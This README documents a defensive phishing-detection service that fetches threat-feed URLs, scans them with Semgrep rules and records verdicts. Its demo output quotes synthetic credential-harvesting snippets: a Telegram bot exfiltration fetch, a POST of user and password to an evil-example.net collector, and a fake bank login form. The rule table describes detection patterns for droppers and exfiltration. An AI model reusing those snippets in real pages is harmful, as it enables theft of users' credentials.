# Brain: payload inspection and decision engine (Member 2)

Takes an event in the team's shared contract, fetches what the URL serves, scans it with Semgrep and fills in the verdict fields.

| In (from Member 1) | Out (to Member 3) |
|---|---|
| `action_status: "PENDING"` | `semgrep_detected`, `confidence_score`, `evidence`, and `action_status` set to `VERIFIED`, `REJECTED` or `FETCH_FAILED` |

All other fields pass through unchanged.

## Member 1 integration

The ingestion implementation from `feature/clickhouse-ingest` is included at
commit `1f80f6f`, including the OpenPhish/ThreatFox adapters, autonomous daemon,
and run telemetry. Its public API and domain summaries are described in
[INTERFACE.md](../INTERFACE.md). Use one app environment for both parts:

```sh
python -m pip install -r requirements.txt
# Fill in the gitignored clickhouse.env using clickhouse.env.example.
python ingest.py --feeds all --limit 100
# Autonomous ingestion, per-feed schedules and exponential backoff:
python ingest.py --daemon --limit 100
python threatfeed.py --stats
python -m brain.worker --once
python -m brain.worker --limit 25 --interval 10
```

The worker reads up to 25 full URL events, calls the existing batch scanner,
and appends the eight shared-contract fields to `events`. Member 1's
`incoming_threats` keeps feed metadata; the worker marks only the scanned
**event ID** as `SCANNED`, using Member 1's synchronous update API. It does not
mark an entire domain complete after scanning one page. The separate events
table retains VERIFIED, REJECTED or FETCH_FAILED for Member 3 to consume with
`SELECT * FROM events FINAL WHERE action_status = 'VERIFIED'`.

`brain/clickhouse.py` is the per-event adapter because domain summaries do not
include event IDs and their URL list is capped at ten. Its pending query excludes
already persisted verdicts, so partial writes resume from unwritten events.
An interrupted raw-status mutation is reconciled on the next poll. Run one
worker per database; parallel workers require an external claim/lease mechanism.
The ingest poller should also have only one writer per database.

`CLICKHOUSE_DATABASE` selects the database namespace. `THREATS_TABLE` (raw feed
rows, default `incoming_threats`) and `VERDICTS_TABLE` (shared-contract verdicts,
default `events`) select validated table names for isolated development/tests.
`VERDICTS_TABLE` is the same variable the Actor reads. The Actor uses
`EVENTS_TABLE` for the raw feed table, so the Brain deliberately does not read it. URLhaus/OpenPhish/ThreatFox feed rows
set the independent-feed flag; synthetic demo rows use `feed_source: demo` and
receive no feed confidence bonus.

Ingestion defaults to URLhaus; use `--feeds openphish`, `--feeds threatfox`, or
`--feeds all` to select the new sources. `--limit` applies per feed;
`--threat-type` and DNS resolution apply only to URLhaus. OpenPhish reports
`phishing` using its fetch time; ThreatFox normalizes `botnet_cc` to `c2` and
`payload_delivery` to `malware_download`. ThreatFox domain and IP/port indicators
are represented as HTTP URLs; the scanner inspects HTTP text, so a C2 listing
alone does not establish a scanner verdict or guarantee a fetchable page.

OpenPhish and ThreatFox IDs are namespaced and stable across polls. The same
URL on different feeds remains separate events and may be scanned twice.
Domain activity counts distinct URLs per hour, while threat-type and verdict
graphs count events. A feed failure allows other selected feeds to proceed;
if all candidate records fail mapping, ingestion exits with code 3.
The daemon defaults to all feeds, backs off each failing feed separately, and
continues polling. `RUNS_TABLE` defaults to `ingest_runs`; it stores per-attempt
counters and errors for `get_feed_stats()`. This telemetry is separate from the
three scanner graphs. A telemetry write failure does not undo successful ingestion.

### Refined integration tests and graphs

The ordinary suite runs without ClickHouse and skips database tests. To opt in,
point the connection variables at a **local test server**, set
`RUN_CLICKHOUSE_TESTS=1`, and run `python -m pytest tests -q`. Database roundtrip
tests use unique databases; Member 1's smoke test uses a unique table and
restores `THREATS_TABLE`. No real malicious URL or live feed is fetched.

Coverage includes the updated filters and domain rules, repeated IDs, timestamp
preservation, newest-first domain URL summaries, the ten-URL summary cap,
all three scanner verdicts, per-event write-back, empty queues, malformed scan
responses and recovery after interrupted writes. Graph tests verify hourly
distinct URL counts, distinct event counts by threat type and current verdict
counts after event version replacement.

```sh
python -m brain.telemetry --output graph-data.json
# Optional SVG/PNG/PDF export; Matplotlib is separate from runtime requirements.
python -m pip install -r requirements-plots.txt
python -m brain.telemetry --output graph-data.json --plot graph-summary.svg
```

The JSON contains `domain_activity`, `threat_types` and `scanner_verdicts` for a
dashboard to consume. Activity buckets use the feed's report timestamp in UTC,
not ingestion time. Verdicts count current scanner-stage events from `events
FINAL`; events advanced to an Actor status are excluded. Pending/unscanned feed
rows are not classified as rejected. The plot shows the ten busiest domains;
JSON retains every domain. Pass `INTEGRATION_GRAPH_OUTPUT=artifacts/member1-integration`
to the opt-in tests to export JSON/SVG/PNG from the three owned demo fixtures.

The local database was tested with ClickHouse 26.9.14.10. Shared ClickHouse Cloud
credentials and live URLhaus polling are not verified by these synthetic tests.

Validation on 2026-10-09: the full suite with the local database enabled finished
`33 passed, 1 warning in 310.06s`. The focused integration suite without a
database finished `12 passed, 5 skipped in 0.40s`. The warning is the existing
Starlette/httpx deprecation. The generated [SVG](../artifacts/member1-integration.svg),
[PNG](../artifacts/member1-integration.png) and [JSON](../artifacts/member1-integration.json)
show the synthetic fixture: two hourly buckets with 1 and 2 URLs, threat counts
of 2 phishing and 1 malware-download reports, and one of each scanner verdict.

Multi-feed update validation on 2026-10-09: focused offline tests finished
`37 passed, 6 skipped`; ingestion self-checks finished `32/32 checks passed`.
The added tests cover feed selection, malformed URLs/ports/timestamps, IPv6,
stable IDs, partial feed outages, and feed provenance reaching the scanner.
Daemon tests verify scheduling after crashed cycles, backoff after 1,100
consecutive failures, recovery after success, telemetry write failures, and
restoration of both smoke-test table overrides. Dashboard tests cover missing
run tables, bounded recent-run queries, UTC timestamps and mapped counters.
An added opt-in database test checks OpenPhish/ThreatFox repeat polling,
write-back, overlapping URL counts and `c2` graph categories. The database
rerun could not be completed: the temporary ClickHouse container exited,
and the environment's approval review blocked restarting it. Live feeds
were not contacted.

## Setup

Install Semgrep in its own environment: it pins dependency versions that conflict with FastAPI's.

```sh
# app
python -m venv .venv
.venv/Scripts/pip install -r requirements.txt      # Linux/macOS: .venv/bin/pip

# semgrep, separately
pipx install semgrep                               # or a second venv
```

If `semgrep` is not on `PATH`, set `SEMGREP_BIN` to the executable. On Windows, create the Semgrep venv in a short path (for example `C:\sg`); the install fails on long paths.

## Use

```sh
# one URL
python -m brain.pipeline https://suspicious.example/login

# an event file in the shared contract, with the full findings list
python -m brain.pipeline --event event.json --findings

# HTTP service
uvicorn brain.service:app --port 8002
curl -X POST localhost:8002/scan -H "content-type: application/json" \
  -d '{"event_id":"evt-1","target_url":"https://suspicious.example/","timestamp":"2026-10-09T11:00:00Z"}'
```

`POST /scan` returns the event plus a `findings` array (rule, category, weight, file, line, snippet), which is outside the shared contract and meant for the abuse notice.

### Batch scans

A site usually has several pages worth checking. Pass them together: the pages
are fetched in parallel and scanned in a single Semgrep run, which matters
because Semgrep takes several seconds to start.

```sh
python -m brain.pipeline https://a.example/ https://a.example/login https://a.example/pay

curl -X POST localhost:8002/scan/batch -H "content-type: application/json"   -d '{"events":[{"event_id":"evt-1","target_url":"https://a.example/","timestamp":"2026-10-09T11:00:00Z"},
                 {"event_id":"evt-2","target_url":"https://a.example/login","timestamp":"2026-10-09T11:00:00Z"}]}'
```

`POST /scan/batch` takes 1 to 25 events and returns `results` (one per event, in
request order, each with its own verdict and `findings`) and a `summary` with
counts by `action_status` and the highest-confidence event. Each URL is judged
separately; nothing is merged into a per-site verdict. The caller supplies the
URLs: the scanner does not crawl links.

From Python:

```python
from brain.pipeline import process_event, process_events
event, findings = process_event(event)
pairs = process_events(events)   # batch: list of (event, findings)
```

## Demo sites

```sh
python -m http.server 8765 --bind 127.0.0.1 --directory demo-sites
BRAIN_ALLOW_PRIVATE=1 python -m brain.pipeline http://127.0.0.1:8765/phish/    # VERIFIED, 0.95
BRAIN_ALLOW_PRIVATE=1 python -m brain.pipeline http://127.0.0.1:8765/benign/   # REJECTED, 0.0
```

## Settings

| Variable | Default | Meaning |
|---|---|---|
| `SEMGREP_BIN` | `semgrep` on `PATH` | Path to the Semgrep executable |
| `BRAIN_THRESHOLD` | `0.6` | Minimum confidence for `VERIFIED` |
| `BRAIN_ALLOW_PRIVATE` | unset | Set to `1` to allow localhost and private addresses (local demo only) |

## How the verdict is made

1. **Fetch** (`fetcher.py`): plain HTTP GET, never rendered or executed. 10-second timeout, 3 redirects, 2 MB cap, text only. Inline scripts are split into `inline_N.js`, external ones fetched as `ext_N.js`. Private and loopback addresses are refused.
2. **Scan** (`scan.py`): `semgrep-rules/phishing.yaml`. Findings marked `cross_origin_only` are dropped when the URL they matched is on the page's own site.
3. **Decide** (`decide.py`): confidence is `1 − ∏(1 − weight)` over the distinct rules that matched, plus 0.15 if the caller says an independent feed also lists the URL, capped at 0.99.

| Rule | Detects | Weight |
|---|---|---|
| `cross-origin-credential-post` | Requests with a body to a hard-coded external destination | 0.6 |
| `telegram-bot-exfil` | Telegram bot sendMessage/sendDocument URLs | 0.7 |
| `fake-login-form` | Password forms posting to an absolute URL on another site | 0.6 |
| `obfuscated-loader` | Decoded code execution or document writes | 0.4 |
| `obfuscated-redirect` | Redirects to decoded destinations | 0.3 |
| `shell-dropper` | Download, chmod and shell execution sequences | 0.7 |
| `decoded-credential-request` | A password value sent to an atob-decoded URL, including concatenated window fetch/atob aliases | 0.6 |
| `escaped-remote-script` | document.write of a percent-encoded remote script tag | 0.4 |

The new rules are in `semgrep-rules/obfuscation.yaml`. The decoded-request rule
requires a password-like selector and the same destination variable used by the
request. It handles the direct request and alias patterns in the fixtures; it
does not decode arbitrary JavaScript or follow every possible obfuscation.
Escaped remote script injection combines with `obfuscated-loader` for 0.64;
ordinary escaped markup stays at 0.4 and is rejected at the default threshold.

## Tests and evaluation

```sh
python -m pytest tests -q        # includes real Semgrep scans; takes several minutes
python -m brain.evaluate         # rules against a regex baseline on samples/
```

Before adding the two rules (13 hand-written samples):

| Detector | Detection rate | False-positive rate |
|---|---|---|
| Semgrep rules | 71% (5 of 7) | 0% (0 of 6) |
| Regex baseline | 71% (5 of 7) | 100% (6 of 6) |

After adding the two rules and two benign samples (15 samples):

| Detector | Detection rate | False-positive rate |
|---|---|---|
| Semgrep rules | 100% (7 of 7) | 0% (0 of 8) |
| Regex baseline | 71% (5 of 7) | 88% (7 of 8) |

| Label | Sample | Semgrep score before | Semgrep score after | Regex flag |
|---|---|---|---|---|
| malicious | cred-post | 0.6 | 0.6 | yes |
| malicious | dropper | 0.7 | 0.7 | yes |
| malicious | evasive | 0.0 | 0.6 | no |
| malicious | fake-form | 0.6 | 0.6 | yes |
| malicious | obfuscated-eval | 0.4 | 0.64 | yes |
| malicious | redirect | 0.72 | 0.72 | yes |
| malicious | telegram | 0.7 | 0.7 | no |
| benign | analytics | 0.0 | 0.0 | yes |
| benign | base64-image | 0.0 | 0.0 | yes |
| benign | install-script | 0.0 | 0.0 | yes |
| benign | own-login | 0.0 | 0.0 | yes |
| benign | search | 0.0 | 0.0 | yes |
| benign | sso-form | 0.0 | 0.0 | yes |
| benign | decoded-request (new) | — | 0.0 | yes |
| benign | escaped-markup (new) | — | 0.4 | no |

The samples are synthetic and few, so treat this as a sanity check rather than
a benchmark. The full suite passed before (`7 passed, 1 warning in 71.81s`) and
after (`13 passed, 1 warning in 195.34s`). The after run includes an API-key test
added concurrently in the shared workspace as well as the five new rule cases.
The warning is an existing Starlette/httpx deprecation; no dependency was added
to suppress it. The new tests cover both formerly missed samples, the benign
counterexamples, and direct fetch with destination variable binding. No existing
test or assertion was changed. A new benign test initially expected zero findings;
it was corrected to require zero *new-rule* matches and a score below 0.6 because
the existing loader rule deliberately notices escaped document writes at 0.4.

## Guild agent

[Verifier](../agents/verifier/README.md) (`dotimothy~threat-verifier`) gives a
second opinion on a scan result plus the captured scripts. Its review-only form
builds and runs on Guild: it judged the `evasive` sample malicious and the
`own-login` sample benign. The fuller workflow that calls `/scan`, checks feeds
and writes events is written but cannot run until `/scan` has a stable public
URL and those integrations exist.

## Verified HTTP demo

Started uvicorn on `127.0.0.1:8002` and Python's static HTTP server on
`127.0.0.1:8765` with `BRAIN_ALLOW_PRIVATE=1` and `SEMGREP_BIN` set, then sent
real HTTP `POST /scan` requests. Both returned HTTP 200: phishing was VERIFIED
at 0.95 and benign was REJECTED at 0.0. Full responses follow.

```json
{
  "phish": {
    "event_id": "evt-demo-phish",
    "target_url": "http://127.0.0.1:8765/phish/",
    "timestamp": "2026-10-09T11:00:00Z",
    "semgrep_detected": true,
    "confidence_score": 0.95,
    "evidence": "Semgrep rule `telegram-bot-exfil` matched ext_0.js line 12: fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=0&text=${user}`); (also matched: cross-origin-credential-post, fake-login-form)",
    "action_status": "VERIFIED",
    "proof_url": "",
    "findings": [
      {
        "rule": "telegram-bot-exfil",
        "category": "credential_harvester",
        "weight": 0.7,
        "file": "ext_0.js",
        "line": 12,
        "end_line": 12,
        "snippet": "fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=0&text=${user}`);"
      },
      {
        "rule": "cross-origin-credential-post",
        "category": "credential_harvester",
        "weight": 0.6,
        "file": "ext_0.js",
        "line": 7,
        "end_line": 10,
        "snippet": "await fetch(\"https://collector.evil-example.net/log\", {\n    method: \"POST\",\n    body: JSON.stringify({ user, pass }),\n  });"
      },
      {
        "rule": "fake-login-form",
        "category": "credential_harvester",
        "weight": 0.6,
        "file": "page.html",
        "line": 16,
        "end_line": 20,
        "snippet": "<form id=\"login\" method=\"post\" action=\"https://harvest.evil-example.net/save.php\">\n    <h1>Acme Bank</h1>\n    <p>Your session expired. Sign in to verify your account.</p>\n    <input id=\"email\" type=\"email\" name=\"email\" placeholder=\"Email\">\n    <input id=\"password\" type=\"password\" name=\"password\" placeholder=\"Password\">"
      }
    ]
  },
  "benign": {
    "event_id": "evt-demo-benign",
    "target_url": "http://127.0.0.1:8765/benign/",
    "timestamp": "2026-10-09T11:00:00Z",
    "semgrep_detected": false,
    "confidence_score": 0.0,
    "evidence": "No Semgrep rule matched",
    "action_status": "REJECTED",
    "proof_url": "",
    "findings": []
  }
}
```

## Safety

The fetcher talks to hostile servers. Run it in WSL or a container, never open a capture in a browser, and keep `BRAIN_ALLOW_PRIVATE` unset anywhere but local demos.
